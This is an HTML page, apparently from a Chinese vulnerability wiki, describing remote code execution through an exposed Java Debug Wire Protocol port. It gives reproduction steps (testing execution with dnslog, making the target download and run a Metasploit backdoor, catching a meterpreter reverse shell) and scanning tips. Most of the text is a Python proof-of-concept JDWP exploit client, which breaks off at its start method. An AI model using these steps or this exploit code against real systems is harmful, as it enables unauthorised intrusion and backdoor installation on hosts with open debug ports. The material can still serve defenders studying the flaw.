@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JDWP/JDWP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>JDWP 远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "JDWP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../JEEVMS%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/JEEVMS%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../JEEVMS%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/JEEVMS%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        JEEVMS仓库管理系统任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../JD-FreeFuck/JD-FreeFuck%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../JD-FreeFuck/JD-FreeFuck%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        JD-FreeFuck 后台命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="jdwp">JDWP 远程代码执行漏洞<a class="headerlink" href="#jdwp" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>JDWP 是 Java Debug Wire Protocol 的缩写，在JPDA（Java Platform
+Debugger Architecture）中，它定义了调试器（debugger）和被调试的 Java
+虚拟机（target vm）之间的通信协议。与PHP的 Xdebug
+类似，当其调试端口直接开放在公网上时，很容易被攻击者攻击并且获取系统权限。</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>开启了JDWP服务的主机。</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="dnslog">利用dnslog确定可以执行命令：<a class="headerlink" href="#dnslog" title="Permanent link">&para;</a></h3>
+<p><img alt="1.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" />执行结果：<img alt="2.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
+<h3 id="msfweb">生成msf后门文件，并将其放入自己的web目录下：<a class="headerlink" href="#msfweb" title="Permanent link">&para;</a></h3>
+<p><img alt="3.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
+<h3 id="_4">执行命令，让目标主机下载后门：<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p><img alt="4.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
+<h3 id="msf">设置msf,让其处于监听状态：<a class="headerlink" href="#msf" title="Permanent link">&para;</a></h3>
+<p><img alt="5.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId32.png" /><img alt="6.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png" /><img alt="7.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png" /></p>
+<h3 id="_5">给予后门可执行的权限，并执行后门：<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p><img alt="8.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId36.png" /><img alt="9.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId37.png" /></p>
+<h3 id="msfshell">查看msf反弹shell情况：<a class="headerlink" href="#msfshell" title="Permanent link">&para;</a></h3>
+<p><img alt="10.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId39.png" /></p>
+<h3 id="sessionmeterpreterctrlcsessions-1session">这个时候session已经成功创建，但是没办法正常出现meterpreter终端。这个时候需要ctrl+c，然后用sessions 1来使用创建的session。<a class="headerlink" href="#sessionmeterpreterctrlcsessions-1session" title="Permanent link">&para;</a></h3>
+<p><img alt="11.png" src="../resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId41.png" /></p>
+<h3 id="ps">ps<a class="headerlink" href="#ps" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>　　1、不要直接反弹shell，弹不过来的。
+　　2、在使用Msf生成后门反弹的时候，往往会卡在&quot;session 1 opend&quot;，这个时候使用ctrl + c强制退出，然后使用session 1，选择session即可解决。
+　　3、JDWP的端口是随机选择的，所以在探测的时候要选择全端口。具体判断的时候nmap可以判断出来，
+Java Debug Wire Protocol (Reference Imp lementation)version 1.8 1.8.0 181，这个是我遇到的那个服务版本。
+</code></pre></div>
+
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">urllib</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
+
+
+
+<span class="c1">################################################################################</span>
+<span class="c1">#</span>
+<span class="c1"># JDWP protocol variables</span>
+<span class="c1">#</span>
+<span class="n">HANDSHAKE</span>                 <span class="o">=</span> <span class="s2">&quot;JDWP-Handshake&quot;</span>
+
+<span class="n">REQUEST_PACKET_TYPE</span>       <span class="o">=</span> <span class="mh">0x00</span>
+<span class="n">REPLY_PACKET_TYPE</span>         <span class="o">=</span> <span class="mh">0x80</span>
+
+<span class="c1"># Command signatures</span>
+<span class="n">VERSION_SIG</span>               <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">CLASSESBYSIGNATURE_SIG</span>    <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">ALLCLASSES_SIG</span>            <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">ALLTHREADS_SIG</span>            <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">IDSIZES_SIG</span>               <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>
+<span class="n">CREATESTRING_SIG</span>          <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">SUSPENDVM_SIG</span>             <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">RESUMEVM_SIG</span>              <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>
+<span class="n">SIGNATURE_SIG</span>             <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">FIELDS_SIG</span>                <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">METHODS_SIG</span>               <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
+<span class="n">GETVALUES_SIG</span>             <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>
+<span class="n">CLASSOBJECT_SIG</span>           <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">INVOKESTATICMETHOD_SIG</span>    <span class="o">=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">REFERENCETYPE_SIG</span>         <span class="o">=</span> <span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">INVOKEMETHOD_SIG</span>          <span class="o">=</span> <span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>
+<span class="n">STRINGVALUE_SIG</span>           <span class="o">=</span> <span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">THREADNAME_SIG</span>            <span class="o">=</span> <span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">THREADSUSPEND_SIG</span>         <span class="o">=</span> <span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">THREADRESUME_SIG</span>          <span class="o">=</span> <span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+<span class="n">THREADSTATUS_SIG</span>          <span class="o">=</span> <span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">EVENTSET_SIG</span>              <span class="o">=</span> <span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">EVENTCLEAR_SIG</span>            <span class="o">=</span> <span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">EVENTCLEARALL_SIG</span>         <span class="o">=</span> <span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
+
+<span class="c1"># Other codes</span>
+<span class="n">MODKIND_COUNT</span>             <span class="o">=</span> <span class="mi">1</span>
+<span class="n">MODKIND_THREADONLY</span>        <span class="o">=</span> <span class="mi">2</span>
+<span class="n">MODKIND_CLASSMATCH</span>        <span class="o">=</span> <span class="mi">5</span>
+<span class="n">MODKIND_LOCATIONONLY</span>      <span class="o">=</span> <span class="mi">7</span>
+<span class="n">EVENT_BREAKPOINT</span>          <span class="o">=</span> <span class="mi">2</span>
+<span class="n">SUSPEND_EVENTTHREAD</span>       <span class="o">=</span> <span class="mi">1</span>
+<span class="n">SUSPEND_ALL</span>               <span class="o">=</span> <span class="mi">2</span>
+<span class="n">NOT_IMPLEMENTED</span>           <span class="o">=</span> <span class="mi">99</span>
+<span class="n">VM_DEAD</span>                   <span class="o">=</span> <span class="mi">112</span>
+<span class="n">INVOKE_SINGLE_THREADED</span>    <span class="o">=</span> <span class="mi">2</span>
+<span class="n">TAG_OBJECT</span>                <span class="o">=</span> <span class="mi">76</span>
+<span class="n">TAG_STRING</span>                <span class="o">=</span> <span class="mi">115</span>
+<span class="n">TYPE_CLASS</span>                <span class="o">=</span> <span class="mi">1</span>
+<span class="n">MODKIND_STEP</span>              <span class="o">=</span> <span class="mi">10</span> 
+<span class="n">EVENTKIND_STEP</span>            <span class="o">=</span> <span class="mi">1</span>
+<span class="n">STEP_MIN</span>                  <span class="o">=</span> <span class="mi">0</span>
+<span class="n">STEP_INTO</span>                 <span class="o">=</span> <span class="mi">0</span>
+
+<span class="c1">################################################################################</span>
+<span class="c1">#</span>
+<span class="c1"># JDWP client class</span>
+<span class="c1">#</span>
+<span class="k">class</span><span class="w"> </span><span class="nc">JDWPClient</span><span class="p">:</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">host</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">methods</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">fields</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">id</span> <span class="o">=</span> <span class="mh">0x01</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">create_packet</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cmdsig</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">):</span>
+        <span class="n">flags</span> <span class="o">=</span> <span class="mh">0x00</span>
+        <span class="n">cmdset</span><span class="p">,</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">cmdsig</span>
+        <span class="n">pktlen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="mi">11</span>
+        <span class="n">pkt</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;IIccc&quot;</span><span class="p">,</span> <span class="n">pktlen</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">flags</span><span class="p">),</span> <span class="nb">chr</span><span class="p">(</span><span class="n">cmdset</span><span class="p">),</span> <span class="nb">chr</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
+        <span class="n">pkt</span><span class="o">+=</span> <span class="n">data</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">id</span> <span class="o">+=</span> <span class="mi">2</span>
+        <span class="k">return</span> <span class="n">pkt</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">read_reply</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">header</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
+        <span class="n">pktlen</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">errcode</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;IIcH&quot;</span><span class="p">,</span> <span class="n">header</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">flags</span> <span class="o">==</span> <span class="nb">chr</span><span class="p">(</span><span class="n">REPLY_PACKET_TYPE</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">errcode</span> <span class="p">:</span>
+                <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Received errcode </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">errcode</span><span class="p">)</span>
+
+        <span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+        <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">+</span> <span class="mi">11</span> <span class="o">&lt;</span> <span class="n">pktlen</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+                <span class="n">buf</span> <span class="o">+=</span> <span class="n">data</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">buf</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">parse_entries</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">formats</span><span class="p">,</span> <span class="n">explicit</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+        <span class="n">entries</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
+
+
+        <span class="k">if</span> <span class="n">explicit</span><span class="p">:</span>
+            <span class="n">nb_entries</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+            <span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">nb_entries</span> <span class="o">=</span> <span class="mi">1</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nb_entries</span><span class="p">):</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
+            <span class="k">for</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">formats</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">fmt</span> <span class="o">==</span> <span class="s2">&quot;L&quot;</span> <span class="ow">or</span> <span class="n">fmt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
+                    <span class="n">data</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;Q&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span> <span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+                    <span class="n">index</span> <span class="o">+=</span> <span class="mi">8</span>
+                <span class="k">elif</span> <span class="n">fmt</span> <span class="o">==</span> <span class="s2">&quot;I&quot;</span> <span class="ow">or</span> <span class="n">fmt</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+                    <span class="n">data</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
+                    <span class="n">index</span> <span class="o">+=</span> <span class="mi">4</span>
+                <span class="k">elif</span> <span class="n">fmt</span> <span class="o">==</span> <span class="s1">&#39;S&#39;</span><span class="p">:</span>
+                    <span class="n">l</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+                    <span class="n">data</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">4</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span><span class="n">l</span><span class="p">]</span>
+                    <span class="n">index</span> <span class="o">+=</span> <span class="mi">4</span><span class="o">+</span><span class="n">l</span>
+                <span class="k">elif</span> <span class="n">fmt</span> <span class="o">==</span> <span class="s1">&#39;C&#39;</span><span class="p">:</span>
+                    <span class="n">data</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;c&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">index</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
+                    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+                <span class="k">elif</span> <span class="n">fmt</span> <span class="o">==</span> <span class="s1">&#39;Z&#39;</span><span class="p">:</span>
+                    <span class="n">t</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;c&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">index</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
+                    <span class="k">if</span> <span class="n">t</span> <span class="o">==</span> <span class="mi">115</span><span class="p">:</span>
+                        <span class="n">s</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">solve_string</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">9</span><span class="p">])</span>
+                        <span class="n">data</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span>
+                        <span class="n">index</span><span class="o">+=</span><span class="mi">9</span>
+                    <span class="k">elif</span> <span class="n">t</span> <span class="o">==</span> <span class="mi">73</span><span class="p">:</span>
+                        <span class="n">data</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">5</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+                        <span class="n">buf</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">5</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">9</span><span class="p">])</span>
+                        <span class="n">index</span><span class="o">=</span><span class="mi">0</span>
+
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="nb">print</span> <span class="s2">&quot;Error&quot;</span>
+                    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+            <span class="n">entries</span><span class="o">.</span><span class="n">append</span><span class="p">(</span> <span class="n">data</span> <span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">entries</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">format</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">fmt</span> <span class="o">==</span> <span class="s2">&quot;L&quot;</span> <span class="ow">or</span> <span class="n">fmt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;Q&quot;</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">fmt</span> <span class="o">==</span> <span class="s2">&quot;I&quot;</span> <span class="ow">or</span> <span class="n">fmt</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+
+        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Unknown format&quot;</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">unformat</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">fmt</span> <span class="o">==</span> <span class="s2">&quot;L&quot;</span> <span class="ow">or</span> <span class="n">fmt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;Q&quot;</span><span class="p">,</span> <span class="n">value</span><span class="p">[:</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">elif</span> <span class="n">fmt</span> <span class="o">==</span> <span class="s2">&quot;I&quot;</span> <span class="ow">or</span> <span class="n">fmt</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">value</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Unknown format&quot;</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">handshake</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
